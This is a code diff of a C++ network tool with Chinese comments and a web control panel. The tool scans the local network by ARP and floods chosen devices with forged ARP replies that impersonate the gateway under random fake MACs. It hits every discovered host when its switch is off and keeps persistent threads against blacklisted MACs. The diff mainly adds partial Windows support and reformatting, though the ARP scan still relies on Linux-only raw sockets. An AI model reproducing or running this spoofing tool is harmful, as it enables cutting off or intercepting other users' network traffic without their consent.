@@ -9,13 +9,6 @@
 #include <sys/socket.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
-#include <net/if.h>
-#include <sys/ioctl.h>
-#include <unistd.h>
-#include <ifaddrs.h>
-#include <linux/if_packet.h>
-#include <net/ethernet.h>
-#include <pcap/pcap.h>
 #include <algorithm>
 #include <thread>
 #include <cstdlib>
@@ -23,25 +16,45 @@
 #include <array>
 #include <atomic>
 
+// 平台相关头文件
+#ifdef _WIN32
+#include <winsock2.h>
+#include <iphlpapi.h>
+#include <ws2tcpip.h>
+#pragma comment(lib, "iphlpapi.lib")
+#pragma comment(lib, "ws2_32.lib")
+#else
+#include <net/if.h>
+#include <sys/ioctl.h>
+#include <unistd.h>
+#include <ifaddrs.h>
+#include <linux/if_packet.h>
+#include <net/ethernet.h>
+#endif
+
+#include <pcap/pcap.h>
 
 using namespace httplib;
 using json = nlohmann::json;
 
 // 公共数据结构
-struct Device {
+struct Device
+{
   std::string name;
   std::string ip;
   std::string mac;
 };
 
-struct InterfaceInfo {
+struct InterfaceInfo
+{
   std::string name;
   struct in_addr ip_addr;
   struct in_addr netmask;
   uint8_t mac_addr[6];
 };
 
-struct arp_header {
+struct arp_header
+{
   uint16_t hardware_type;
   uint16_t protocol_type;
   uint8_t hardware_size;
@@ -55,33 +68,33 @@ struct arp_header {
 
 // MAC地址池
 std::vector<std::array<uint8_t, 6>> mac_pool = {
-  {0x00, 0x11, 0x22, 0x33, 0x44, 0x55},
-  {0x00, 0x11, 0x22, 0x33, 0x44, 0x56},
-  {0x00, 0x11, 0x22, 0x33, 0x44, 0x57},
-  {0x00, 0x11, 0x22, 0x33, 0x44, 0x58},
-  {0x00, 0x11, 0x22, 0x33, 0x44, 0x59},
-  {0x00, 0x11, 0x22, 0x33, 0x44, 0x5A},
-  {0x00, 0x11, 0x22, 0x33, 0x44, 0x5B},
-  {0x00, 0x11, 0x22, 0x33, 0x44, 0x5C},
-  {0x00, 0x11, 0x22, 0x33, 0x44, 0x5D},
-  {0x00, 0x11, 0x22, 0x33, 0x44, 0x5E},
-  {0x00, 0x11, 0x22, 0x33, 0x44, 0x5F},
-  {0x00, 0x11, 0x22, 0x33, 0x44, 0x60},
-  {0x00, 0x11, 0x22, 0x33, 0x44, 0x61},
-  {0x00, 0x11, 0x22, 0x33, 0x44, 0x62},
-  {0x00, 0x11, 0x22, 0x33, 0x44, 0x63},
-  {0x00, 0x11, 0x22, 0x33, 0x44, 0x64},
-  {0x00, 0x11, 0x22, 0x33, 0x44, 0x65},
-  {0x00, 0x11, 0x22, 0x33, 0x44, 0x66},
-  {0x00, 0x11, 0x22, 0x33, 0x44, 0x67},
-  {0x00, 0x11, 0x22, 0x33, 0x44, 0x68},
-  {0x00, 0x11, 0x22, 0x33, 0x44, 0x69},
-  {0x00, 0x11, 0x22, 0x33, 0x44, 0x6A},
-  {0x00, 0x11, 0x22, 0x33, 0x44, 0x6B},
-  {0x00, 0x11, 0x22, 0x33, 0x44, 0x6C},
-  {0x00, 0x11, 0x22, 0x33, 0x44, 0x6D},
-  {0x00, 0x11, 0x22, 0x33, 0x44, 0x6E},
-  {0x00, 0x11, 0x22, 0x33, 0x44, 0x6F},
+    {0x00, 0x11, 0x22, 0x33, 0x44, 0x55},
+    {0x00, 0x11, 0x22, 0x33, 0x44, 0x56},
+    {0x00, 0x11, 0x22, 0x33, 0x44, 0x57},
+    {0x00, 0x11, 0x22, 0x33, 0x44, 0x58},
+    {0x00, 0x11, 0x22, 0x33, 0x44, 0x59},
+    {0x00, 0x11, 0x22, 0x33, 0x44, 0x5A},
+    {0x00, 0x11, 0x22, 0x33, 0x44, 0x5B},
+    {0x00, 0x11, 0x22, 0x33, 0x44, 0x5C},
+    {0x00, 0x11, 0x22, 0x33, 0x44, 0x5D},
+    {0x00, 0x11, 0x22, 0x33, 0x44, 0x5E},
+    {0x00, 0x11, 0x22, 0x33, 0x44, 0x5F},
+    {0x00, 0x11, 0x22, 0x33, 0x44, 0x60},
+    {0x00, 0x11, 0x22, 0x33, 0x44, 0x61},
+    {0x00, 0x11, 0x22, 0x33, 0x44, 0x62},
+    {0x00, 0x11, 0x22, 0x33, 0x44, 0x63},
+    {0x00, 0x11, 0x22, 0x33, 0x44, 0x64},
+    {0x00, 0x11, 0x22, 0x33, 0x44, 0x65},
+    {0x00, 0x11, 0x22, 0x33, 0x44, 0x66},
+    {0x00, 0x11, 0x22, 0x33, 0x44, 0x67},
+    {0x00, 0x11, 0x22, 0x33, 0x44, 0x68},
+    {0x00, 0x11, 0x22, 0x33, 0x44, 0x69},
+    {0x00, 0x11, 0x22, 0x33, 0x44, 0x6A},
+    {0x00, 0x11, 0x22, 0x33, 0x44, 0x6B},
+    {0x00, 0x11, 0x22, 0x33, 0x44, 0x6C},
+    {0x00, 0x11, 0x22, 0x33, 0x44, 0x6D},
+    {0x00, 0x11, 0x22, 0x33, 0x44, 0x6E},
+    {0x00, 0x11, 0x22, 0x33, 0x44, 0x6F},
 };
 
 // 全局状态
@@ -91,71 +104,78 @@ std::vector<Device> devices;
 std::unordered_set<std::string> blacklist;
 InterfaceInfo iface_info;
 std::string gateway_ip;
-pcap_t* pcap_handle = nullptr;
+pcap_t *pcap_handle = nullptr;
 std::atomic<bool> switch_status{true};
 
 // 初始化随机数生成器
-void init_random() {
+void init_random()
+{
   std::srand(static_cast<unsigned int>(std::time(nullptr)));
 }
 
 // 从MAC地址池中随机选择一个MAC地址
-const uint8_t* get_random_mac() {
+const uint8_t *get_random_mac()
+{
   return mac_pool[std::rand() % mac_pool.size()].data();
 }
 
 // 将6字节MAC地址转换为字符串格式
-std::string mac_to_string(const uint8_t mac[6]) 
+std::string mac_to_string(const uint8_t mac[6])
 {
-	char buffer[18];
-	snprintf(buffer, sizeof(buffer),
-					"%02X:%02X:%02X:%02X:%02X:%02X",
-					mac[0], mac[1], mac[2],
-					mac[3], mac[4], mac[5]);
-	return std::string(buffer);
+  char buffer[18];
+  snprintf(buffer, sizeof(buffer),
+           "%02X:%02X:%02X:%02X:%02X:%02X",
+           mac[0], mac[1], mac[2],
+           mac[3], mac[4], mac[5]);
+  return std::string(buffer);
 }
 
 // 逆向转换
-bool string_to_mac(const std::string& str, uint8_t mac[6]) 
+bool string_to_mac(const std::string &str, uint8_t mac[6])
 {
   unsigned int values[6];
   int count = sscanf(str.c_str(), "%02X:%02X:%02X:%02X:%02X:%02X",
-                   &values[0], &values[1], &values[2],
-                   &values[3], &values[4], &values[5]);
-  if (count != 6) return false;
-  
-  for(int i=0; i<6; i++) 
+                     &values[0], &values[1], &values[2],
+                     &values[3], &values[4], &values[5]);
+  if (count != 6)
+    return false;
+
+  for (int i = 0; i < 6; i++)
     mac[i] = static_cast<uint8_t>(values[i]);
   return true;
 }
 
 // 目标设备信息结构
-struct TargetInfo {
+struct TargetInfo
+{
   std::string ip;
   uint8_t mac[6];
-  
-  bool operator==(const TargetInfo& other) const {
-		return ip == other.ip && 
-				 std::equal(mac, mac+6, other.mac);
-	}
+
+  bool operator==(const TargetInfo &other) const
+  {
+    return ip == other.ip &&
+           std::equal(mac, mac + 6, other.mac);
+  }
 };
 
 // 验证IP格式
-bool is_valid_ip(const std::string& ip) 
+bool is_valid_ip(const std::string &ip)
 {
   static const std::regex ip_pattern(R"((\d{1,3}\.){3}\d{1,3})");
   return std::regex_match(ip, ip_pattern);
 }
 
 // 执行shell命令
-std::string execute_command(const std::string& cmd) 
+std::string execute_command(const std::string &cmd)
 {
-  FILE* fp = popen(cmd.c_str(), "r");
-  if (!fp) return "";
-  
+  FILE *fp = popen(cmd.c_str(), "r");
+  if (!fp)
+    return "";
+
   char buffer[256];
   std::string result;
-  while (fgets(buffer, sizeof(buffer), fp)) {
+  while (fgets(buffer, sizeof(buffer), fp))
+  {
     result += buffer;
   }
   pclose(fp);
@@ -163,50 +183,151 @@ std::string execute_command(const std::string& cmd)
 }
 
 // 获取网关IP
-std::string get_gateway_ip(void) 
+std::string get_gateway_ip(void)
 {
+#ifdef _WIN32
+  PIP_ADAPTER_INFO pAdapterInfo = NULL;
+  PIP_ADAPTER_INFO pAdapter = NULL;
+  ULONG ulOutBufLen = sizeof(IP_ADAPTER_INFO);
+  std::string gateway;
+  
+  pAdapterInfo = (IP_ADAPTER_INFO *)malloc(sizeof(IP_ADAPTER_INFO));
+  if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW) {
+    free(pAdapterInfo);
+    pAdapterInfo = (IP_ADAPTER_INFO *)malloc(ulOutBufLen);
+  }
+  
+  if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == NO_ERROR) {
+    for (pAdapter = pAdapterInfo; pAdapter; pAdapter = pAdapter->Next) {
+      if (pAdapter->GatewayList.IpAddress.String[0] != '0') {
+        gateway = pAdapter->GatewayList.IpAddress.String;
+        break;
+      }
+    }
+  }
+  
+  if (pAdapterInfo) free(pAdapterInfo);
+  return gateway;
+#else
   std::string output = execute_command("ip route | grep default");
   size_t pos = output.find("via ");
-  return (pos != std::string::npos) ? 
-         output.substr(pos + 4, output.find(' ', pos + 4) - (pos + 4)) : "";
+  return (pos != std::string::npos) ? output.substr(pos + 4, output.find(' ', pos + 4) - (pos + 4)) : "";
+#endif
 }
 
 // 获取默认接口名称
-std::string get_default_interface(void) 
+std::string get_default_interface(void)
 {
+#ifdef _WIN32
+  PIP_ADAPTER_INFO pAdapterInfo = NULL;
+  PIP_ADAPTER_INFO pAdapter = NULL;
+  ULONG ulOutBufLen = sizeof(IP_ADAPTER_INFO);
+  std::string iface;
+  
+  pAdapterInfo = (IP_ADAPTER_INFO *)malloc(sizeof(IP_ADAPTER_INFO));
+  if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW) {
+    free(pAdapterInfo);
+    pAdapterInfo = (IP_ADAPTER_INFO *)malloc(ulOutBufLen);
+  }
+  
+  if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == NO_ERROR) {
+    for (pAdapter = pAdapterInfo; pAdapter; pAdapter = pAdapter->Next) {
+      if (pAdapter->GatewayList.IpAddress.String[0] != '0') {
+        iface = pAdapter->AdapterName;
+        break;
+      }
+    }
+  }
+  
+  if (pAdapterInfo) free(pAdapterInfo);
+  return iface;
+#else
   std::string output = execute_command("ip route | grep default | awk '{print $5}'");
   output.erase(std::remove(output.begin(), output.end(), '\n'), output.end());
   return output;
+#endif
 }
 
-
 // 获取单个接口的MAC地址
-void get_interface_mac(const std::string& name, uint8_t* mac) 
+void get_interface_mac(const std::string &name, uint8_t *mac)
 {
+#ifdef _WIN32
+  PIP_ADAPTER_INFO pAdapterInfo = NULL;
+  PIP_ADAPTER_INFO pAdapter = NULL;
+  ULONG ulOutBufLen = sizeof(IP_ADAPTER_INFO);
+  
+  pAdapterInfo = (IP_ADAPTER_INFO *)malloc(sizeof(IP_ADAPTER_INFO));
+  if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW) {
+    free(pAdapterInfo);
+    pAdapterInfo = (IP_ADAPTER_INFO *)malloc(ulOutBufLen);
+  }
+  
+  if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == NO_ERROR) {
+    for (pAdapter = pAdapterInfo; pAdapter; pAdapter = pAdapter->Next) {
+      if (name == pAdapter->AdapterName) {
+        memcpy(mac, pAdapter->Address, 6);
+        break;
+      }
+    }
+  }
+  
+  if (pAdapterInfo) free(pAdapterInfo);
+#else
   struct ifreq ifr;
   int sock = socket(AF_INET, SOCK_DGRAM, 0);
-  if (sock < 0) return;
+  if (sock < 0)
+    return;
 
   strncpy(ifr.ifr_name, name.c_str(), IFNAMSIZ);
-  if (ioctl(sock, SIOCGIFHWADDR, &ifr) == 0) {
+  if (ioctl(sock, SIOCGIFHWADDR, &ifr) == 0)
+  {
     memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
   }
   close(sock);
+#endif
 }
 
 // 获取网络接口列表
-std::vector<InterfaceInfo> get_network_interfaces() {
+std::vector<InterfaceInfo> get_network_interfaces()
+{
   std::vector<InterfaceInfo> interfaces;
+#ifdef _WIN32
+  PIP_ADAPTER_INFO pAdapterInfo = NULL;
+  PIP_ADAPTER_INFO pAdapter = NULL;
+  ULONG ulOutBufLen = sizeof(IP_ADAPTER_INFO);
+
+  pAdapterInfo = (IP_ADAPTER_INFO *)malloc(sizeof(IP_ADAPTER_INFO));
+  if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW) {
+    free(pAdapterInfo);
+    pAdapterInfo = (IP_ADAPTER_INFO *)malloc(ulOutBufLen);
+  }
+
+  if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == NO_ERROR) {
+    for (pAdapter = pAdapterInfo; pAdapter; pAdapter = pAdapter->Next) {
+      InterfaceInfo info;
+      info.name = pAdapter->AdapterName;
+      inet_pton(AF_INET, pAdapter->IpAddressList.IpAddress.String, &info.ip_addr);
+      inet_pton(AF_INET, pAdapter->IpAddressList.IpMask.String, &info.netmask);
+      memcpy(info.mac_addr, pAdapter->Address, 6);
+      interfaces.push_back(info);
+    }
+  }
+
+  if (pAdapterInfo) free(pAdapterInfo);
+#else
   struct ifaddrs *ifaddr;
-  
+
   // 使用map暂存接口信息
   std::map<std::string, InterfaceInfo> interface_map;
 
-  if (getifaddrs(&ifaddr) == -1) return interfaces;
+  if (getifaddrs(&ifaddr) == -1)
+    return interfaces;
 
   // 第一遍遍历：获取所有接口的MAC地址
-  for (auto ifa = ifaddr; ifa; ifa = ifa->ifa_next) {
-    if (ifa->ifa_addr && ifa->ifa_addr->sa_family == AF_PACKET) {
+  for (auto ifa = ifaddr; ifa; ifa = ifa->ifa_next)
+  {
+    if (ifa->ifa_addr && ifa->ifa_addr->sa_family == AF_PACKET)
+    {
       InterfaceInfo info;
       info.name = ifa->ifa_name;
       get_interface_mac(info.name, info.mac_addr);
@@ -215,12 +336,15 @@ std::vector<InterfaceInfo> get_network_interfaces() {
   }
 
   // 第二遍遍历：获取IPv4地址
-  for (auto ifa = ifaddr; ifa; ifa = ifa->ifa_next) {
-    if (ifa->ifa_addr && ifa->ifa_addr->sa_family == AF_INET) {
+  for (auto ifa = ifaddr; ifa; ifa = ifa->ifa_next)
+  {
+    if (ifa->ifa_addr && ifa->ifa_addr->sa_family == AF_INET)
+    {
       auto it = interface_map.find(ifa->ifa_name);
-      if (it != interface_map.end()) {
-        auto ip = reinterpret_cast<sockaddr_in*>(ifa->ifa_addr);
-        auto mask = reinterpret_cast<sockaddr_in*>(ifa->ifa_netmask);
+      if (it != interface_map.end())
+      {
+        auto ip = reinterpret_cast<sockaddr_in *>(ifa->ifa_addr);
+        auto mask = reinterpret_cast<sockaddr_in *>(ifa->ifa_netmask);
         it->second.ip_addr = ip->sin_addr;
         it->second.netmask = mask->sin_addr;
       }
@@ -228,16 +352,18 @@ std::vector<InterfaceInfo> get_network_interfaces() {
   }
 
   // 转换map到vector
-  for (auto& [name, info] : interface_map) {
+  for (auto &[name, info] : interface_map)
+  {
     interfaces.push_back(info);
   }
 
   freeifaddrs(ifaddr);
+#endif
   return interfaces;
 }
 
 // 生成IP地址范围
-std::vector<std::string> generate_ip_range(in_addr ip, in_addr netmask) 
+std::vector<std::string> generate_ip_range(in_addr ip, in_addr netmask)
 {
   std::vector<std::string> ips;
   uint32_t host = ntohl(ip.s_addr);
@@ -245,7 +371,8 @@ std::vector<std::string> generate_ip_range(in_addr ip, in_addr netmask)
   uint32_t network = host & mask;
   uint32_t broadcast = network | (~mask);
 
-  for (uint32_t i = network + 1; i < broadcast; ++i) {
+  for (uint32_t i = network + 1; i < broadcast; ++i)
+  {
     struct in_addr addr;
     addr.s_addr = htonl(i);
     ips.push_back(inet_ntoa(addr));
@@ -254,14 +381,15 @@ std::vector<std::string> generate_ip_range(in_addr ip, in_addr netmask)
 }
 
 // 发送ARP请求包
-void send_arp_requests(int sock, const InterfaceInfo& iface, const std::vector<std::string>& ip_list) 
+void send_arp_requests(int sock, const InterfaceInfo &iface, const std::vector<std::string> &ip_list)
 {
   struct sockaddr_ll sa = {};
   sa.sll_family = AF_PACKET;
-	sa.sll_protocol = htons(ETH_P_ARP);
+  sa.sll_protocol = htons(ETH_P_ARP);
   sa.sll_ifindex = if_nametoindex(iface.name.c_str());
 
-  for (const auto& ip : ip_list) {
+  for (const auto &ip : ip_list)
+  {
     struct ether_header eth;
     struct arp_header arp;
 
@@ -286,36 +414,38 @@ void send_arp_requests(int sock, const InterfaceInfo& iface, const std::vector<s
     char packet[sizeof(eth) + sizeof(arp)];
     memcpy(packet, &eth, sizeof(eth));
     memcpy(packet + sizeof(eth), &arp, sizeof(arp));
-    sendto(sock, packet, sizeof(packet), 0, (struct sockaddr*)&sa, sizeof(sa));
+    sendto(sock, packet, sizeof(packet), 0, (struct sockaddr *)&sa, sizeof(sa));
   }
 }
 
 // 处理ARP响应包
-TargetInfo process_arp_response(const uint8_t* buffer) 
+TargetInfo process_arp_response(const uint8_t *buffer)
 {
   TargetInfo info;
-  const struct arp_header* arp = reinterpret_cast<const arp_header*>(buffer + sizeof(ether_header));
-  
+  const struct arp_header *arp = reinterpret_cast<const arp_header *>(buffer + sizeof(ether_header));
+
   char ip_str[INET_ADDRSTRLEN];
   inet_ntop(AF_INET, arp->sender_ip, ip_str, sizeof(ip_str));
   info.ip = ip_str;
   memcpy(info.mac, arp->sender_mac, 6);
-  
+
   return info;
 }
 
 // 执行ARP扫描
-std::vector<TargetInfo> arp_scan(const InterfaceInfo &iface) 
+std::vector<TargetInfo> arp_scan(const InterfaceInfo &iface)
 {
   std::vector<TargetInfo> targets;
   int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
-  if (sock < 0) return targets;
+  if (sock < 0)
+    return targets;
 
   // 绑定网络接口
   struct sockaddr_ll sa = {};
   sa.sll_family = AF_PACKET;
   sa.sll_ifindex = if_nametoindex(iface.name.c_str());
-  if (bind(sock, (struct sockaddr*)&sa, sizeof(sa)) < 0) {
+  if (bind(sock, (struct sockaddr *)&sa, sizeof(sa)) < 0)
+  {
     close(sock);
     return targets;
   }
@@ -326,17 +456,22 @@ std::vector<TargetInfo> arp_scan(const InterfaceInfo &iface)
 
   // 接收响应
   time_t start = time(nullptr);
-  while (time(nullptr) - start < 2) {
+  while (time(nullptr) - start < 2)
+  {
     uint8_t buffer[4096];
     ssize_t len = recvfrom(sock, buffer, sizeof(buffer), 0, nullptr, nullptr);
-    
-    if (len >= static_cast<ssize_t>(sizeof(ether_header) + sizeof(arp_header))) {
-      ether_header *eth = reinterpret_cast<ether_header*>(buffer);
-      if (ntohs(eth->ether_type) == ETH_P_ARP) {
-        arp_header *arp = reinterpret_cast<arp_header*>(buffer + sizeof(ether_header));
-        if (ntohs(arp->opcode) == 2) {
+
+    if (len >= static_cast<ssize_t>(sizeof(ether_header) + sizeof(arp_header)))
+    {
+      ether_header *eth = reinterpret_cast<ether_header *>(buffer);
+      if (ntohs(eth->ether_type) == ETH_P_ARP)
+      {
+        arp_header *arp = reinterpret_cast<arp_header *>(buffer + sizeof(ether_header));
+        if (ntohs(arp->opcode) == 2)
+        {
           TargetInfo info = process_arp_response(buffer);
-          if (std::find(targets.begin(), targets.end(), info) == targets.end()) {
+          if (std::find(targets.begin(), targets.end(), info) == targets.end())
+          {
             targets.push_back(info);
           }
         }
@@ -348,13 +483,13 @@ std::vector<TargetInfo> arp_scan(const InterfaceInfo &iface)
   return targets;
 }
 
-bool is_valid_mac(const std::string& mac) 
+bool is_valid_mac(const std::string &mac)
 {
   return std::regex_match(mac, std::regex("^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$"));
 }
 
 // 创建ARP响应包
-arp_header create_arp_reply(const uint8_t* src_mac, const std::string& src_ip, const uint8_t* dst_mac, const std::string& dst_ip) 
+arp_header create_arp_reply(const uint8_t *src_mac, const std::string &src_ip, const uint8_t *dst_mac, const std::string &dst_ip)
 {
   arp_header arp;
   arp.hardware_type = htons(1);
@@ -362,28 +497,29 @@ arp_header create_arp_reply(const uint8_t* src_mac, const std::string& src_ip, c
   arp.hardware_size = ETH_ALEN;
   arp.protocol_size = 4;
   arp.opcode = htons(2);
-  
+
   memcpy(arp.sender_mac, src_mac, 6);
   inet_pton(AF_INET, src_ip.c_str(), arp.sender_ip);
   memcpy(arp.target_mac, dst_mac, 6);
   inet_pton(AF_INET, dst_ip.c_str(), arp.target_ip);
-  
+
   return arp;
 }
 
 // 发送ARP欺骗包
-#define ARP_SPOOF_PACKET_COUNT 1000
-void send_spoof_packet(pcap_t* handle, const TargetInfo& target, const uint8_t* attacker_mac, const std::string& gateway_ip) 
+void send_spoof_packet(pcap_t *handle, const TargetInfo &target, const uint8_t *attacker_mac, const std::string &gateway_ip)
 {
   // 初始化随机数生成器
   static bool initialized = false;
-  if (!initialized) {
+  if (!initialized)
+  {
     init_random();
     initialized = true;
   }
 
   // 检查目标IP是否与网关IP相同，如果相同则直接返回
-  if (target.ip == gateway_ip) {
+  if (target.ip == gateway_ip)
+  {
     return;
   }
 
@@ -393,36 +529,36 @@ void send_spoof_packet(pcap_t* handle, const TargetInfo& target, const uint8_t* 
   auto now_tm = *std::localtime(&now_time_t);
 
   // 输出带有时间的ARP欺诈提示，并包含欺诈的IP地址
-  std::cout << "[" << std::put_time(&now_tm, "%Y-%m-%d %H:%M:%S") << "] ARP欺诈,目标IP: " << target.ip 
+  std::cout << "[" << std::put_time(&now_tm, "%Y-%m-%d %H:%M:%S") << "] ARP欺诈,目标IP: " << target.ip
             << ",伪造网关IP: " << gateway_ip << std::endl;
-  // 发送数据包
-  for (int i = 0; i < ARP_SPOOF_PACKET_COUNT; ++i) {
-    // 预先分配好数据包缓冲区
-    static uint8_t packets[sizeof(ether_header) + sizeof(arp_header)];
-    ether_header* eth = reinterpret_cast<ether_header*>(packets);
-    arp_header* arp = reinterpret_cast<arp_header*>(packets + sizeof(ether_header));
 
-    // 构造以太网头
-    memcpy(eth->ether_dhost, target.mac, ETH_ALEN);
-    const uint8_t* random_mac = get_random_mac();
-    memcpy(eth->ether_shost, random_mac, ETH_ALEN);
-    eth->ether_type = htons(ETH_P_ARP);
+  // 预先分配好数据包缓冲区
+  static uint8_t packets[sizeof(ether_header) + sizeof(arp_header)];
+  ether_header *eth = reinterpret_cast<ether_header *>(packets);
+  arp_header *arp = reinterpret_cast<arp_header *>(packets + sizeof(ether_header));
 
-    // 构造ARP头
-    *arp = create_arp_reply(random_mac, gateway_ip, target.mac, target.ip);
-    
-    if (pcap_sendpacket(handle, packets, sizeof(ether_header) + sizeof(arp_header)) != 0) {
-      std::cerr << "发送失败: " << pcap_geterr(handle) << std::endl;
-    }
+  // 构造以太网头
+  memcpy(eth->ether_dhost, target.mac, ETH_ALEN);
+  const uint8_t *random_mac = get_random_mac();
+  memcpy(eth->ether_shost, random_mac, ETH_ALEN);
+  eth->ether_type = htons(ETH_P_ARP);
+
+  // 构造ARP头
+  *arp = create_arp_reply(random_mac, gateway_ip, target.mac, target.ip);
+
+  if (pcap_sendpacket(handle, packets, sizeof(ether_header) + sizeof(arp_header)) != 0)
+  {
+    std::cerr << "发送失败: " << pcap_geterr(handle) << std::endl;
   }
 }
 
 // 初始化网络信息
-InterfaceInfo initialize_network_info(void) 
+InterfaceInfo initialize_network_info(void)
 {
   std::string iface_name = get_default_interface();
   auto interfaces = get_network_interfaces();
-  auto it = std::find_if(interfaces.begin(), interfaces.end(), [&](const InterfaceInfo& info) { return info.name == iface_name; });
+  auto it = std::find_if(interfaces.begin(), interfaces.end(), [&](const InterfaceInfo &info)
+                         { return info.name == iface_name; });
   return (it != interfaces.end()) ? *it : InterfaceInfo();
 }
 
@@ -430,17 +566,20 @@ InterfaceInfo initialize_network_info(void)
 std::unordered_map<std::string, std::thread> blacklist_threads;
 std::mutex blacklist_threads_mutex;
 // 为黑名单IP启动线程并不断发送ARP数据包
-void start_blacklist_thread(const std::string& ip, const uint8_t* mac, const std::string& gateway_ip, const uint8_t* attacker_mac, pcap_t* handle) {
+void start_blacklist_thread(const std::string &ip, const uint8_t *mac, const std::string &gateway_ip, const uint8_t *attacker_mac, pcap_t *handle)
+{
   std::lock_guard<std::mutex> lock(blacklist_threads_mutex);
-  
+
   // 检查是否已经存在该IP的线程
-  if (blacklist_threads.find(ip) != blacklist_threads.end()) {
+  if (blacklist_threads.find(ip) != blacklist_threads.end())
+  {
     std::cout << "线程已存在，不创建新线程: " << ip << std::endl;
     return;
   }
 
   // 创建新线程
-  std::thread t([ip, mac, gateway_ip, attacker_mac, handle]() {
+  std::thread t([ip, mac, gateway_ip, attacker_mac, handle]()
+                {
     TargetInfo target;
     target.ip = ip;
     memcpy(target.mac, mac, 6);
@@ -455,19 +594,20 @@ void start_blacklist_thread(const std::string& ip, const uint8_t* mac, const std
       if (switch_status.load()) {
         send_spoof_packet(handle, target, attacker_mac, gateway_ip);
       }
-    }
-  });
+    } });
   blacklist_threads[ip] = std::move(t);
 }
 
 // 网络工作线程
-void network_worker(void) 
+void network_worker(void)
 {
-  while (running) {
+  while (running)
+  {
     auto new_targets = arp_scan(iface_info);
-    
+
     std::vector<Device> new_devices;
-    for (const auto& t : new_targets) {
+    for (const auto &t : new_targets)
+    {
       new_devices.push_back({"Unknown", t.ip, mac_to_string(t.mac)});
     }
     {
@@ -475,18 +615,23 @@ void network_worker(void)
       devices.swap(new_devices);
     }
 
-    if (pcap_handle) {
+    if (pcap_handle)
+    {
       std::lock_guard<std::mutex> lock(mtx);
       bool current_status = switch_status.load();
-      for (const auto& t : new_targets) {
+      for (const auto &t : new_targets)
+      {
         // 根据开关状态决定发送策略
-        if (!current_status) { // 关闭状态，广播发送
+        if (!current_status)
+        { // 关闭状态，广播发送
           send_spoof_packet(pcap_handle, t, iface_info.mac_addr, gateway_ip);
-        } 
-        else {
+        }
+        else
+        {
           // 检查是否在黑名单中
           std::string mac_str = mac_to_string(t.mac); // 将MAC地址转换为字符串
-          if (blacklist.count(mac_str) > 0) {
+          if (blacklist.count(mac_str) > 0)
+          {
             std::cout << "检测到黑名单设备: " << t.ip << std::endl;
             // 启动黑名单线程
             uint8_t mac_bytes[6];
@@ -499,61 +644,74 @@ void network_worker(void)
   }
 }
 
-
 // HTTP处理函数
-void add_cors_headers(Response& res) 
+void add_cors_headers(Response &res)
 {
   res.set_header("Access-Control-Allow-Origin", "*");
   res.set_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
   res.set_header("Access-Control-Allow-Headers", "Content-Type");
 }
 
-void serve_html(const Request& req, Response& res) 
+void serve_html(const Request &req, Response &res)
 {
   std::ifstream file("./index.html");
-  if (file) {
-    std::string content((std::istreambuf_iterator<char>(file)), 
-              std::istreambuf_iterator<char>());
+  if (file)
+  {
+    std::string content((std::istreambuf_iterator<char>(file)),
+                        std::istreambuf_iterator<char>());
     res.set_content(content, "text/html");
-  } 
-  else {
+  }
+  else
+  {
     res.status = 404;
     res.set_content("Not Found", "text/plain");
   }
 }
 
-int main(void) 
+int main(void)
 {
-    // 初始化网络
-    iface_info = initialize_network_info();
-    gateway_ip = get_gateway_ip();
-    if (iface_info.name.empty() || gateway_ip.empty()) {
-        std::cerr << "网络初始化失败" << std::endl;
-        return 1;
-    }
+  // 初始化网络
+  iface_info = initialize_network_info();
+  gateway_ip = get_gateway_ip();
+  if (iface_info.name.empty() || gateway_ip.empty())
+  {
+    std::cerr << "网络初始化失败" << std::endl;
+    return 1;
+  }
 
-    // 初始化pcap
-    char errbuf[PCAP_ERRBUF_SIZE];
-    pcap_handle = pcap_open_live(iface_info.name.c_str(), 65536, 1, 1000, errbuf);
-    if (!pcap_handle) {
-        std::cerr << "PCAP初始化失败: " << errbuf << std::endl;
-        return 1;
-    }
+  // 初始化pcap
+  char errbuf[PCAP_ERRBUF_SIZE];
+#ifdef _WIN32
+pcap_handle = pcap_open_live(iface_info.name.c_str(), 65536, 1, 1000, errbuf);
+#else
+pcap_handle = pcap_create(iface_info.name.c_str(), errbuf);
+if (pcap_handle) {
+  pcap_set_snaplen(pcap_handle, 65536);
+  pcap_set_promisc(pcap_handle, 1);
+  pcap_set_timeout(pcap_handle, 1000);
+  pcap_activate(pcap_handle);
+}
+#endif
+if (!pcap_handle)
+{
+  std::cerr << "PCAP初始化失败: " << errbuf << std::endl;
+  return 1;
+}
 
-    // 启动网络工作线程
-    running = true;
-    std::thread(network_worker).detach();
+  // 启动网络工作线程
+  running = true;
+  std::thread(network_worker).detach();
 
-    // 启动HTTP服务器
-    Server svr;
+  // 启动HTTP服务器
+  Server svr;
 
-    svr.Options(R"(.*)", [](const Request& req, Response& res) {
-      add_cors_headers(res);
-    });
+  svr.Options(R"(.*)", [](const Request &req, Response &res)
+              { add_cors_headers(res); });
 
-    svr.Get("/", serve_html);
+  svr.Get("/", serve_html);
 
-    svr.Get("/open", [](const Request& req, Response& res) {
+  svr.Get("/open", [](const Request &req, Response &res)
+          {
       try {
         // 获取当前开关状态
         bool current_status = switch_status.load();
@@ -572,10 +730,10 @@ int main(void)
         res.status = 500;
         json error_response = {{"error", "Internal server error"}};
         res.set_content(error_response.dump(), "application/json");
-      }
-    });
+      } });
 
-    svr.Post("/open", [](const Request& req, Response& res) {
+  svr.Post("/open", [](const Request &req, Response &res)
+           {
       try {
         // 检查请求体是否为空
         if (req.body.empty()) {
@@ -618,10 +776,10 @@ int main(void)
         res.status = 500;
         json error_response = {{"error", "Internal server error"}};
         res.set_content(error_response.dump(), "application/json");
-      }
-    });
+      } });
 
-    svr.Get("/devices", [](const Request& req, Response& res) {
+  svr.Get("/devices", [](const Request &req, Response &res)
+          {
